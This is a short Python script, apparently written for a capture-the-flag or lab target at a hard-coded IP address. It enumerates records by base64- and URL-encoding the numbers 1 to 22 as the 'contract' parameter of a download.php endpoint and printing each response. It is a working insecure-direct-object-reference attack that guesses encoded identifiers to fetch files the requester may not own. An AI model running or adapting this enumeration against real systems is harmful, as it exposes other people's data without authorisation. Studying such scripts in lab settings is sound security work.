import requests
import os, sys
import base64
import urllib.request

for i in range(1,23):
    base64bytes = base64.b64encode(str(i).encode('utf-8'))
    baseencoded = str(base64bytes, 'utf-8')
    
    urlencoded = urllib.parse.quote(baseencoded, encoding='utf-8')
    url = 'http://161.35.38.72:32596/download.php?contract='

    r = requests.get(url + urlencoded , timeout=55)
    print(r.content)
